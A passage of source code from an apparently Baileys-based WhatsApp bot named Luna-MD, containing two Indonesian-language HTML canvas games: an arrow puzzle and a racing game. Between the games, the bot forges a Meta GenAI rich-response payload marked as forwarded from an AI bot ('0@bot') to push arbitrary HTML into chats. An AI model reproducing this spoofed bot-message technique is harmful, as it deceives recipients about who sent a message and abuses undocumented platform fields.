.aText{
    color:#a1e8ff;
    font:bold 11px monospace;
    text-align:center;
    line-height:1.5;
}

.aButton{
    margin-top:16px;
    padding:10px 22px;
    border:0;
    border-radius:10px;
    background:#00d2ff;
    color:#061320;
    font:900 12px Arial;
    box-shadow:
        0 0 15px rgba(0, 210, 255, .5),
        0 4px 0 #0093b3;
    transition:.1s;
}

.aButton:active{
    transform:translateY(4px);
    box-shadow:0 0px 0 #0093b3;
}

.aFooter{
    height:30px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 12px;
    margin-top:5px;
    border:1px solid rgba(0, 210, 255, .2);
    border-radius:10px;
    background:#181b33;
    color:#8190ae;
    font:bold 9px monospace;
}
.aFooter span{color:#00d2ff}

</style>

<div class="aWrap">
    <div class="aHeader">
        <div class="aIcon left">↗️</div>
        <div class="aTitle">ARROW</span></div>
        <div class="aIcon right">↘️</div>
    </div>

    <div class="aMain">
        <div class="aStats">LEVEL <span id="aLevel">1</span></div>
        
        <canvas id="aCanvas"></canvas>

        <div class="aOverlay" id="aStart">
            <div class="aOverlayTitle">BREAKOUT!</div>
            <div class="aText">Tap panah untuk meluncur!<br>Pastikan jalurnya tidak terhalang.</div>
            <button class="aButton" id="btnStart">MAIN SEKARANG</button>
        </div>

        <div class="aOverlay hide" id="aNext">
            <div class="aOverlayTitle" style="color:#ffde00; text-shadow:0 0 15px #ffde00;">LEVEL CLEAR!</div>
            <div class="aText">Semua panah berhasil lolos!</div>
            <button class="aButton" id="btnNext" style="background:#ffde00; box-shadow:0 4px 0 #b39b00; color:#201a00;">NEXT LEVEL</button>
        </div>
    </div>

    <div class="aFooter">
        <div>🎯 TAP PANAH TERLUAR</div>
        <div>Luna-MD</div>
    </div>
</div>

<script>
(function(){

const canvas = document.getElementById('aCanvas');
const ctx = canvas.getContext('2d');
const wrap = document.querySelector('.aMain');
const levelEl = document.getElementById('aLevel');
const startOverlay = document.getElementById('aStart');
const nextOverlay = document.getElementById('aNext');
const btnStart = document.getElementById('btnStart');
const btnNext = document.getElementById('btnNext');

let W = 0, H = 0;
let audioCtx = null;
let running = false;
let currentLevel = 0;

let blocks = [];
let escapedBlocks = [];
let particles = [];
let gridSize = 0;
let offsetX = 0, offsetY = 0;
let rows = 0, cols = 0;

// MAPS (U=Up, D=Down, L=Left, R=Right, 0=Empty)
const LEVELS = [
    [
        ['R','R','U'],
        ['D','0','U'],
        ['D','L','L']
    ],
    [
        ['0','U','U','0'],
        ['L','R','U','R'],
        ['L','D','L','R'],
        ['0','D','D','0']
    ],
    [
        ['R','R','R','U','0'],
        ['U','U','R','U','U'],
        ['L','0','R','0','R'],
        ['D','D','L','D','D'],
        ['0','L','L','L','L']
    ],
    [
        ['R','D','0','0','L','U'],
        ['U','R','D','D','L','D'],
        ['U','U','R','L','D','D'],
        ['U','U','R','L','D','D'],
        ['U','R','U','U','L','D'],
        ['D','R','0','0','L','U']
    ]
];

function initAudio(){
    if(audioCtx) return;
    try {
        const AC = window.AudioContext || window.webkitAudioContext;
        audioCtx = new AC();
    } catch(e){}
}

function tone(freq, duration, type='sine', vol=0.03){
    if(!audioCtx) return;
    try{
        if(audioCtx.state === 'suspended') audioCtx.resume();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = type;
        osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
        gain.gain.setValueAtTime(0, audioCtx.currentTime);
        gain.gain.linearRampToValueAtTime(vol, audioCtx.currentTime + 0.01);
        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start();
        osc.stop(audioCtx.currentTime + duration);
    }catch(e){}
}

function soundTap(){ tone(600, 0.1, 'square', 0.04); tone(900, 0.15, 'sine', 0.03); }
function soundError(){ tone(150, 0.15, 'sawtooth', 0.05); }
function soundWin(){
    tone(400, 0.1, 'triangle', 0.05);
    setTimeout(()=>tone(500, 0.1, 'triangle', 0.05), 100);
    setTimeout(()=>tone(650, 0.2, 'triangle', 0.05), 200);
    setTimeout(()=>tone(880, 0.4, 'triangle', 0.05), 300);
}

function resize(){
    const rect = wrap.getBoundingClientRect();
    W = rect.width; H = rect.height;
    const dpr = Math.min(window.devicePixelRatio||1, 2);
    canvas.width = W * dpr;
    canvas.height = H * dpr;
    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    calculateGrid();
}

function calculateGrid(){
    if(!blocks.length) return;
    gridSize = Math.min(W / (cols+2), H / (rows+2));
    if(gridSize > 55) gridSize = 55;
    offsetX = (W - (cols * gridSize)) / 2;
    offsetY = (H - (rows * gridSize)) / 2;
}

function loadLevel(lvlIdx){
    blocks = [];
    escapedBlocks = [];
    particles = [];
    
    let map = LEVELS[lvlIdx % LEVELS.length];
    rows = map.length;
    cols = map[0].length;
    
    for(let r=0; r<rows; r++){
        for(let c=0; c<cols; c++){
            if(map[r][c] !== '0'){
                blocks.push({
                    r: r, c: c, dir: map[r][c],
                    x: c, y: r,
                    shake: 0,
                    isEscaping: false,
                    ex: 0, ey: 0 // escape target coords
                });
            }
        }
    }
    
    levelEl.innerText = (currentLevel + 1);
    resize();
}

function getBlockAt(r, c){
    return blocks.find(b => b.r === r && b.c === c && !b.isEscaping);
}

function canEscape(block){
    let {r, c, dir} = block;
    if (dir === 'U') { for(let i=r-1; i>=0; i--) if(getBlockAt(i, c)) return false; }
    if (dir === 'D') { for(let i=r+1; i<rows; i++) if(getBlockAt(i, c)) return false; }
    if (dir === 'L') { for(let i=c-1; i>=0; i--) if(getBlockAt(r, i)) return false; }
    if (dir === 'R') { for(let i=c+1; i<cols; i++) if(getBlockAt(r, i)) return false; }
    return true;
}

function createConfetti(){
    for(let i=0; i<60; i++){
        particles.push({
            x: W/2, y: H/2,
            vx: (Math.random()-0.5)*10,
            vy: (Math.random()-0.5)*10 - 2,
            size: Math.random()*5+3,
            color: ['#00d2ff','#ffde00','#ff5370','#00ffae'][Math.floor(Math.random()*4)],
            life: 1
        });
    }
}

function drawArrowPath(cx, cy, size, dir){
    ctx.save();
    ctx.translate(cx, cy);
    if(dir==='R') ctx.rotate(0);
    else if(dir==='D') ctx.rotate(Math.PI/2);
    else if(dir==='L') ctx.rotate(Math.PI);
    else if(dir==='U') ctx.rotate(-Math.PI/2);
    
    ctx.beginPath();
    ctx.lineCap = 'round';
    ctx.lineJoin = 'round';
    ctx.lineWidth = size * 0.15;
    ctx.strokeStyle = '#ffffff';
    
    // Line
    ctx.moveTo(-size*0.25, 0);
    ctx.lineTo(size*0.25, 0);
    // Arrow head
    ctx.moveTo(size*0.05, -size*0.2);
    ctx.lineTo(size*0.25, 0);
    ctx.lineTo(size*0.05, size*0.2);
    ctx.stroke();
    ctx.restore();
}

function render(){
    ctx.clearRect(0,0,W,H);
    
    // Draw background dots for grid
    ctx.fillStyle = 'rgba(255,255,255,0.05)';
    for(let r=0; r<=rows; r++){
        for(let c=0; c<=cols; c++){
            ctx.beginPath();
            ctx.arc(offsetX + c*gridSize, offsetY + r*gridSize, 2, 0, Math.PI*2);
            ctx.fill();
        }
    }

    // Draw Escaping Trails
    escapedBlocks.forEach(b => {
        ctx.beginPath();
        ctx.moveTo(offsetX + b.c*gridSize + gridSize/2, offsetY + b.r*gridSize + gridSize/2);
        ctx.lineTo(offsetX + b.x*gridSize + gridSize/2, offsetY + b.y*gridSize + gridSize/2);
        ctx.strokeStyle = '#ffde00';
        ctx.lineWidth = gridSize * 0.3;
        ctx.lineCap = 'round';
        ctx.stroke();
    });

    // Draw Blocks
    [...blocks, ...escapedBlocks].forEach(b => {
        let drawX = offsetX + b.x * gridSize;
        let drawY = offsetY + b.y * gridSize;
        
        if(b.shake > 0){
            drawX += (Math.random()-0.5)*6;
            drawY += (Math.random()-0.5)*6;
            b.shake--;
        }
        
        const pad = gridSize * 0.08;
        const s = gridSize - pad*2;
        
        // Shadow & Body
        ctx.fillStyle = '#006580'; // Darker blue base
        ctx.beginPath();
        ctx.roundRect(drawX+pad, drawY+pad + (b.isEscaping?0:4), s, s, 10);
        ctx.fill();
        
        // Top Face
        ctx.fillStyle = b.isEscaping ? '#ffde00' : '#00d2ff';
        ctx.beginPath();
        ctx.roundRect(drawX+pad, drawY+pad, s, s, 10);
        ctx.fill();
        
        // Highlight
        ctx.fillStyle = 'rgba(255,255,255,0.3)';
        ctx.beginPath();
        ctx.roundRect(drawX+pad, drawY+pad, s, s*0.2, [10,10,0,0]);
        ctx.fill();
        
        drawArrowPath(drawX + gridSize/2, drawY + gridSize/2, gridSize, b.dir);
    });
    
    // Draw Particles
    particles.forEach((p, i) => {
        ctx.globalAlpha = p.life;
        ctx.fillStyle = p.color;
        ctx.fillRect(p.x, p.y, p.size, p.size);
        p.x += p.vx;
        p.y += p.vy;
        p.vy += 0.3; // gravity
        p.life -= 0.02;
        if(p.life <= 0) particles.splice(i, 1);
    });
    ctx.globalAlpha = 1;
}

function update(){
    if(!running) return;
    
    let isMoving = false;
    
    for(let i = escapedBlocks.length-1; i>=0; i--){
        let b = escapedBlocks[i];
        const speed = 0.4;
        isMoving = true;
        
        if(b.dir==='U') b.y -= speed;
        if(b.dir==='D') b.y += speed;
        if(b.dir==='L') b.x -= speed;
        if(b.dir==='R') b.x += speed;
        
        // Remove if way off screen
        if(b.x < -5 || b.x > cols+5 || b.y < -5 || b.y > rows+5){
            escapedBlocks.splice(i, 1);
        }
    }
    
    if(blocks.length === 0 && escapedBlocks.length === 0){
        running = false;
        soundWin();
        createConfetti();
        setTimeout(() => {
            nextOverlay.classList.remove('hide');
        }, 800);
    }
}

function loop(){
    update();
    render();
    requestAnimationFrame(loop);
}

// Controls
canvas.addEventListener('pointerdown', (e) => {
    if(!running) return;
    const rect = canvas.getBoundingClientRect();
    const dpr = Math.min(window.devicePixelRatio||1, 2);
    const mx = (e.clientX - rect.left);
    const my = (e.clientY - rect.top);
    
    const clickC = Math.floor((mx - offsetX) / gridSize);
    const clickR = Math.floor((my - offsetY) / gridSize);
    
    let clickedBlockIndex = blocks.findIndex(b => b.r === clickR && b.c === clickC);
    
    if(clickedBlockIndex !== -1){
        let b = blocks[clickedBlockIndex];
        initAudio();
        
        if(canEscape(b)){
            b.isEscaping = true;
            escapedBlocks.push(b);
            blocks.splice(clickedBlockIndex, 1);
            soundTap();
        } else {
            b.shake = 12;
            soundError();
        }
    }
});

btnStart.addEventListener('click', () => {
    initAudio();
    startOverlay.classList.add('hide');
    loadLevel(currentLevel);
    running = true;
});

btnNext.addEventListener('click', () => {
    nextOverlay.classList.add('hide');
    currentLevel++;
    loadLevel(currentLevel);
    running = true;
});

window.addEventListener('resize', resize);
resize();
loop();

})();
</script>`


const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "racing": {
const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Luna-MD • 2026</title>
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{margin:0;padding:0;width:100%;overflow:hidden;background:transparent;font-family:Arial,sans-serif;touch-action:none;user-select:none;-webkit-user-select:none;}
.raceWrap{width:100%;max-width:440px;margin:0 auto;padding:6px;overflow:hidden;border:3px solid #14284b;border-radius:18px;background:linear-gradient(145deg,#1c3357,#0d1b33);box-shadow:0 6px 20px rgba(0,0,0,0.6),inset 0 1px 0 rgba(255,255,255,0.15);}
.raceHeader{height:40px;display:flex;align-items:center;justify-content:space-between;padding:0 10px;margin-bottom:6px;border:1px solid rgba(255,215,100,0.25);border-radius:12px;background:rgba(15,30,55,0.85);box-shadow:inset 0 1px 0 rgba(255,255,255,0.15);}
.raceTitle{color:#ffd23f;font-weight:900;font-size:15px;letter-spacing:1px;text-shadow:0 2px 4px rgba(0,0,0,0.6);}
.raceTitle span{color:#68c4ff;}
.raceStats{display:flex;align-items:center;gap:8px;color:#eaf2ff;font-size:11px;font-weight:bold;font-family:monospace;}
.raceStats span{color:#ffd23f;}
.muteHeaderBtn{border:1px solid rgba(255,210,63,0.6);border-radius:8px;background:rgba(20,40,70,0.8);color:#ffe9b0;font-size:14px;padding:3px 7px;cursor:pointer;line-height:1;}
.muteHeaderBtn:active{transform:scale(0.92);}
.gameContainer{position:relative;width:100%;overflow:hidden;border:2px solid #14284b;border-radius:14px;background:#7ec4f5;box-shadow:inset 0 0 20px rgba(0,0,0,0.5);}
canvas{width:100%;height:auto;display:block;touch-action:none;aspect-ratio:400/520;}
.pad{margin-top:6px;padding:6px;border:1px solid rgba(255,215,100,0.2);border-radius:14px;background:rgba(10,22,44,0.8);display:flex;gap:6px;}
.cbtn{flex:1;height:56px;border:2px solid #7ec8ff;border-radius:12px;background:linear-gradient(#3a6098,#1d3a66);color:#dff1ff;font-family:'Arial Black',Arial,sans-serif;font-size:18px;line-height:1;cursor:pointer;padding:0;touch-action:none;user-select:none;-webkit-user-select:none;box-shadow:inset 0 2px rgba(255,255,255,0.22),0 3px #0c1c38;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;}
.cbtn small{display:block;font-family:Arial,sans-serif;font-size:8px;color:#9db8dd;letter-spacing:1px;}
.cbtn.held{transform:translateY(2px);background:linear-gradient(#6f9fd4,#2f5a94);}
#brakeBtn{border-color:#ff8a7a;background:linear-gradient(#8a3428,#5a1f16);}
#brakeBtn.held{background:linear-gradient(#ff8a7a,#c04a3a);}
#nitroBtn{border-color:#ffd23f;background:linear-gradient(#b8781a,#7a4e08);color:#ffe9b0;transition:all 0.1s;}
#nitroBtn.held{background:linear-gradient(#00f0ff,#0077b6);color:#fff;border-color:#00f0ff;box-shadow:0 0 15px rgba(0,240,255,0.8),inset 0 2px rgba(255,255,255,0.6);}
.overlay{position:absolute;z-index:40;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(8,14,28,0.78);backdrop-filter:blur(2px);padding:8px;}
.overlay.hidden{display:none;}
.card{width:92%;max-width:320px;padding:16px 14px;border:3px solid #ffd23f;border-radius:18px;background:linear-gradient(#1c3357,#0d1b33);box-shadow:inset 0 0 25px rgba(0,0,0,0.6),0 6px 0 #060c1c,0 15px 35px rgba(0,0,0,0.8);text-align:center;color:#fff;}
.card h1{margin:0 0 2px;color:#ffd23f;font-size:24px;font-family:'Arial Black',Arial,sans-serif;text-shadow:0 2px #000,0 0 16px rgba(255,180,40,0.7);}
.card .big{margin:4px 0 0;font-size:36px;font-family:'Arial Black',Arial,sans-serif;color:#fff;text-shadow:0 3px 0 #16305c,0 0 20px rgba(120,190,255,0.8);line-height:1;}
.card .lbl{margin:0 0 6px;color:#8fa8cf;font-size:9px;letter-spacing:2px;font-weight:bold;}
.card .rows{margin:6px 0 2px;color:#d7e4f7;font-size:12px;line-height:1.8;}
.card .rows b{color:#ffd23f;}
.card .tag{display:none;margin-left:6px;background:#ffd23f;color:#4a2e00;font-size:9px;font-weight:900;padding:2px 6px;border-radius:6px;vertical-align:middle;}
.btns{display:flex;gap:8px;margin-top:10px;}
.btns button{flex:1;height:42px;border:2px solid #7a5a00;border-radius:12px;font-family:'Arial Black',Arial,sans-serif;font-weight:900;font-size:13px;cursor:pointer;color:#4a2e00;background:linear-gradient(#ffe27a,#f5a71b);box-shadow:inset 0 2px rgba(255,255,255,0.5),0 3px #7a5a00;}
.btns button.ghost{border-color:#16305c;color:#d7e8ff;background:linear-gradient(#3a6098,#1d3a66);box-shadow:inset 0 2px rgba(255,255,255,0.25),0 3px #0c1c38;}
.btns button:active{transform:translateY(2px);}
</style>
</head>
 
<body>
 
<div class="raceWrap">
  <div class="raceHeader">
    <div class="raceTitle">🏎️ TURBO <span>RACE • 2026</span></div>
    <div class="raceStats">
      <div>LAP <span id="topLap">1/3</span></div>
      <div>POS <span id="topPos">P6</span></div>
      <button id="muteBtn" class="muteHeaderBtn">🔊</button>
    </div>
  </div>
 
  <div class="gameContainer">
    <canvas id="canvas" width="400" height="520"></canvas>
    <div class="overlay hidden" id="over">
      <div class="card">
        <h1 id="ovTitle">FINISH!</h1>
        <div class="big" id="ovPos">P1</div>
        <div class="lbl">POSISI AKHIR</div>
        <p class="rows">
          ⏱️ Total: <b id="ovTime">0:00.00</b><br>
          🏁 Lap terbaik: <b id="ovBest">0:00.00</b>
          <span class="tag" id="newBest">REKOR!</span>
        </p>
        <div class="btns">
          <button id="againBtn">RACE LAGI</button>
          <button id="menuBtn" class="ghost">MENU</button>
        </div>
      </div>
    </div>
  </div>
 
  <div class="pad">
    <button class="cbtn" id="btnL"><span>◀</span><small>KIRI</small></button>
    <button class="cbtn" id="brakeBtn"><span>🛑</span><small>REM</small></button>
    <button class="cbtn" id="nitroBtn"><span>🔥</span><small>NITRO</small></button>
    <button class="cbtn" id="btnR"><span>▶</span><small>KANAN</small></button>
  </div>
</div>
 
<script>
window.addEventListener('error',function(e){
    try{
        var c=document.getElementById('canvas');
        var x=c.getContext('2d');
        x.setTransform(1,0,0,1,0,0);
        x.fillStyle='rgba(40,0,0,0.92)';
        x.fillRect(0,0,c.width,c.height);
        x.fillStyle='#ffdddd';
        x.font='13px monospace';
        x.textAlign='left';x.textBaseline='top';
        x.fillText('GAME ERROR:',10,10);
        x.fillText(String(e.message||e).substr(0,60),10,30);
    }catch(e2){}
});
(function(){
    try{
        var p=CanvasRenderingContext2D.prototype;
        if(!p.ellipse){
            p.ellipse=function(x,y,rx,ry,rot,a0,a1,ccw){
                if(rx<0.01)rx=0.01;
                this.save();this.translate(x,y);this.rotate(rot);
                this.scale(1,ry/rx);
                this.arc(0,0,rx,a0,a1,ccw);
                this.restore();
            };
        }
    }catch(e){}
})();
</script>
 
<script>
(function(){
'use strict';
 
var PI=Math.PI,TAU=PI*2;
 
var canvas=document.getElementById('canvas');
var ctx=canvas.getContext('2d');
var btnL=document.getElementById('btnL');
var btnR=document.getElementById('btnR');
var brakeBtn=document.getElementById('brakeBtn');
var nitroBtn=document.getElementById('nitroBtn');
var muteBtn=document.getElementById('muteBtn');
var topLap=document.getElementById('topLap');
var topPos=document.getElementById('topPos');
var over=document.getElementById('over');
var ovTitle=document.getElementById('ovTitle');
var ovPos=document.getElementById('ovPos');
var ovTime=document.getElementById('ovTime');
var ovBest=document.getElementById('ovBest');
var newTag=document.getElementById('newBest');
var againBtn=document.getElementById('againBtn');
var menuBtn=document.getElementById('menuBtn');
 
var W=400,H=520,dpr=1;
 
var AU=(function(){
    var ac=null,master=null,muted=false,nb=null;
    var eng=null,windG=null;
    var musT=null,musStep=0,musNext=0,MUSVOL=1;
    var SPB=0.105;
    var BASS=[110,110,131,131,98,98,147,131];
    var LEAD=[440,0,523,0,659,0,587,523,
              440,0,523,0,698,659,587,0];
 
    function init(){
        if(ac)return;
        var A=window.AudioContext||window.webkitAudioContext;
        if(!A)return;
        try{
            ac=new A();
            master=ac.createGain();master.gain.value=0.55;
            master.connect(ac.destination);
            var n=ac.sampleRate*2;
            nb=ac.createBuffer(1,n,ac.sampleRate);
            var d=nb.getChannelData(0);
            for(var i=0;i<n;i++)d[i]=Math.random()*2-1;
        }catch(e){ac=null;}
    }
    function resume(){
        init();
        if(ac&&ac.state==='suspended')ac.resume();
        startMusic();
    }
    function T(w,f0,f1,d,p,a,dl){
        if(!ac||muted)return;
        try{
            var o=ac.createOscillator(),g=ac.createGain();
            o.type=w;
            var t0=ac.currentTime+Math.max(0,dl||0);
            o.frequency.setValueAtTime(f0,t0);
            if(f1)o.frequency.exponentialRampToValueAtTime(Math.max(30,f1),t0+d*0.85);
            g.gain.setValueAtTime(0.0001,t0);
            g.gain.exponentialRampToValueAtTime(Math.max(0.001,p),t0+(a||0.004));
            g.gain.exponentialRampToValueAtTime(0.0001,t0+(a||0.004)+d);
            o.connect(g);g.connect(master);
            o.start(t0);o.stop(t0+(a||0.004)+d+0.06);
        }catch(e){}
    }
    function N(d,ft,f0,f1,p,a){
        if(!ac||muted||!nb)return;
        try{
            var t0=ac.currentTime;
            var s=ac.createBufferSource();s.buffer=nb;s.loop=true;
            var f=ac.createBiquadFilter();f.type=ft;f.Q.value=0.9;
            f.frequency.setValueAtTime(f0,t0);
            if(f1)f.frequency.exponentialRampToValueAtTime(Math.max(40,f1),t0+d*0.9);
            var g=ac.createGain();
            g.gain.setValueAtTime(0.0001,t0);
            g.gain.exponentialRampToValueAtTime(Math.max(0.001,p),t0+(a||0.005));
            g.gain.exponentialRampToValueAtTime(0.0001,t0+(a||0.005)+d);
            s.connect(f);f.connect(g);g.connect(master);
            s.start(t0);s.stop(t0+d+0.06);
        }catch(e){}
    }
    function startMusic(){
        if(musT||!ac)return;
        musNext=ac.currentTime+0.1;
        musT=setInterval(function(){
            if(!ac||muted)return;
            if(ac.currentTime-musNext>0.3)musNext=ac.currentTime+0.05;
            while(musNext<ac.currentTime+0.15){
                playStep(musStep,musNext-ac.currentTime);
                musNext+=SPB;
                musStep=(musStep+1)%16;
            }
        },40);
    }
    function playStep(i,dl){
        var v=MUSVOL;
        var f=LEAD[i];
        if(f)T('square',f,0,0.12,0.035*v,0.004,dl);
        if(i%2===0)T('triangle',BASS[(i/2)|0],0,0.16,0.07*v,0.004,dl);
        if(i%4===0)T('sine',150,42,0.11,0.12*v,0.002,dl);
        if(i%4===2)N(0.06,'highpass',1800,0,0.045*v,0.002);
        if(i%2===1)N(0.03,'highpass',7000,0,0.014*v,0.001);
    }
    return {
        resume:resume,
        setMusicVol:function(v){MUSVOL=v;},
        toggle:function(){
            muted=!muted;
            if(master)master.gain.value=muted?0:0.55;
            if(!muted&&ac)musNext=ac.currentTime+0.05;
            return muted;
        },
        engineOn:function(){
            if(!ac||eng)return;
            try{
                var o=ac.createOscillator();o.type='sawtooth';
                var o2=ac.createOscillator();o2.type='square';
                var f=ac.createBiquadFilter();
                f.type='lowpass';f.frequency.value=950;
                var g=ac.createGain();g.gain.value=0;
                o.connect(f);o2.connect(f);f.connect(g);g.connect(master);
                o.start();o2.start();
                eng={o:o,o2:o2,g:g};
                var s=ac.createBufferSource();s.buffer=nb;s.loop=true;
                var wf=ac.createBiquadFilter();
                wf.type='lowpass';wf.frequency.value=600;
                windG=ac.createGain();windG.gain.value=0;
                s.connect(wf);wf.connect(windG);windG.connect(master);
                s.start();
            }catch(e){eng=null;}
        },
        engine:function(pct,on,nit){
            if(!eng||!ac)return;
            try{
                var fq=58+pct*480+(nit?280:0);
                eng.o.frequency.setTargetAtTime(fq,ac.currentTime,0.04);
                eng.o2.frequency.setTargetAtTime(fq*0.5,ac.currentTime,0.04);
                var vol=on?(0.05+0.06*pct+(nit?0.05:0)):0;
                eng.g.gain.setTargetAtTime(vol,ac.currentTime,0.07);
                if(windG)windG.gain.setTargetAtTime(
                    on?(pct*pct*0.12+(nit?0.12:0)):0,ac.currentTime,0.08);
            }catch(e){}
        },
        beep:function(step){
            var f=(step===1||step===true)?988:(step===2?784:622);
            T('square',f,0,(step===1||step===true)?0.35:0.20,0.18,0.003);
            T('sine',f*0.5,0,0.22,0.14,0.003);
        },
        go:function(){
            T('square',1046,0,0.40,0.28,0.003);
            T('square',1318,0,0.38,0.28,0.003,0.04);
            T('square',1568,0,0.42,0.35,0.003,0.08);
            N(0.4,'lowpass',4000,300,0.28,0.01);
        },
        skid:function(){N(0.14,'bandpass',900,600,0.11,0.01);},
        rumble:function(){N(0.05,'lowpass',300,200,0.09,0.003);},
        thud:function(){
            T('sine',120,40,0.18,0.4,0.004);
            N(0.12,'lowpass',800,200,0.25,0.004);
        },
        nitroOn:function(){
            N(0.6,'highpass',500,4500,0.35,0.02);
            T('sawtooth',200,950,0.45,0.22,0.01);
            T('sine',90,40,0.35,0.3,0.005);
        },
        aiNitro:function(){
            N(0.4,'highpass',600,3800,0.22,0.02);
            T('sawtooth',170,720,0.30,0.16,0.01);
        },
        lap:function(){
            T('triangle',659,0,0.12,0.2,0.005);
            T('triangle',880,0,0.2,0.2,0.005,0.11);
        },
        overtake:function(){
            T('triangle',523,0,0.09,0.2,0.005);
            T('triangle',784,0,0.14,0.2,0.005,0.08);
        },
        passed:function(){
            T('triangle',392,0,0.12,0.16,0.005);
            T('triangle',262,0,0.16,0.16,0.005,0.1);
        },
        fanfare:function(){
            var n=[392,523,659,784,1046,1319];
            for(var i=0;i<n.length;i++)
                T('triangle',n[i],0,0.2,0.2,0.01,i*0.08);
            N(0.5,'lowpass',5000,400,0.28,0.01);
        }
    };
})();
 
function rnd(a,b){return Math.random()*(b-a)+a;}
function ri(a,b){return Math.floor(rnd(a,b+1));}
function clamp(v,a,b){return v<a?a:(v>b?b:v);}
function lerp(a,b,t){return a+(b-a)*t;}
function frac(v){return v-Math.floor(v);}
function mixc(a,b,t){
    return [a[0]+(b[0]-a[0])*t,a[1]+(b[1]-a[1])*t,a[2]+(b[2]-a[2])*t];
}
function rgbS(c){return 'rgb('+(c[0]|0)+','+(c[1]|0)+','+(c[2]|0)+')';}
function rrect(x,y,w,h,r){
    r=Math.min(r,w/2,Math.max(h/2,0));
    ctx.beginPath();
    ctx.moveTo(x+r,y);
    ctx.lineTo(x+w-r,y);
    ctx.quadraticCurveTo(x+w,y,x+w,y+r);
    ctx.lineTo(x+w,y+h-r);
    ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h);
    ctx.lineTo(x+r,y+h);
    ctx.quadraticCurveTo(x,y+h,x,y+h-r);
    ctx.lineTo(x,y+r);
    ctx.quadraticCurveTo(x,y,x+r,y);
    ctx.closePath();
}
function qf(a,b,c,d){
    ctx.beginPath();
    ctx.moveTo(a[0],a[1]);ctx.lineTo(b[0],b[1]);
    ctx.lineTo(c[0],c[1]);ctx.lineTo(d[0],d[1]);
    ctx.closePath();ctx.fill();
}
function txt(str,x,y,size,fill,stroke,lw,align){
    ctx.font='900 '+size+'px "Arial Black","Arial Bold",Arial,sans-serif';
    ctx.textAlign=align||'center';
    ctx.textBaseline='middle';
    ctx.lineJoin='round';
    if(stroke){
        ctx.strokeStyle=stroke;
        ctx.lineWidth=lw||Math.max(3,size*0.16);
        ctx.strokeText(str,x,y);
    }
    if(fill){
        ctx.fillStyle=fill;
        ctx.fillText(str,x,y);
    }
}
function pill(str,x,y,size,fill,pad){
    pad=pad||6;
    ctx.font='900 '+size+'px "Arial Black","Arial Bold",Arial,sans-serif';
    var tw=ctx.measureText(str).width;
    ctx.fillStyle='rgba(6,14,22,0.72)';
    rrect(x-tw/2-pad,y-size*0.7-pad*0.5,tw+pad*2,size*1.44+pad,size*0.55);
    ctx.fill();
    txt(str,x,y,size,fill||'#fff',null,0);
}
function pillL(str,x,y,size,fill,pad){
    pad=pad||6;
    ctx.font='900 '+size+'px "Arial Black","Arial Bold",Arial,sans-serif';
    var tw=ctx.measureText(str).width;
    ctx.fillStyle='rgba(6,14,22,0.72)';
    rrect(x-pad,y-size*0.7-pad*0.5,tw+pad*2,size*1.44+pad,size*0.55);
    ctx.fill();
    txt(str,x+tw/2,y,size,fill||'#fff',null,0);
}
function fmtT(t){
    if(t<0||!isFinite(t))t=0;
    var m=Math.floor(t/60),s=t-m*60;
    return m+':'+(s<10?'0':'')+s.toFixed(2);
}
 
var SEG=200,ROADW=2000,CAMH=1050;
var DRAW=170;
var camDepth=0.84;
var LAPS=3;
var segments=[],trackLen=0;
var treesBy={},signsBy={};
 
function easeIn(a,b,t){return a+(b-a)*t*t;}
function easeInOut(a,b,t){return a+(b-a)*((-Math.cos(t*PI)/2)+0.5);}
function lastY(){
    return segments.length?segments[segments.length-1].y2:0;
}
function addSeg(curve,y){
    segments.push({i:segments.length,curve:curve,
        y1:lastY(),y2:y});
}
function addRoad(enter,hold,leave,curve,dy){
    var M=1.5;
    enter=Math.round(enter*M);hold=Math.round(hold*M);leave=Math.round(leave*M);
    var sy=lastY(),ey=sy+dy,tot=enter+hold+leave,n;
    for(n=0;n<enter;n++)
        addSeg(easeIn(0,curve,n/enter),easeInOut(sy,ey,n/tot));
    for(n=0;n<hold;n++)
        addSeg(curve,easeInOut(sy,ey,(enter+n)/tot));
    for(n=0;n<leave;n++)
        addSeg(easeInOut(curve,0,n/leave),easeInOut(sy,ey,(enter+hold+n)/tot));
}
function buildTrack(){
    segments=[];treesBy={};signsBy={};
    addRoad(16, 75, 16,  0,    0);
    addRoad(18, 40, 18,  5.8, -25);
    addRoad(18, 42, 18, -6.2,  35);
    addRoad(22, 65, 22,  3.6,  15);
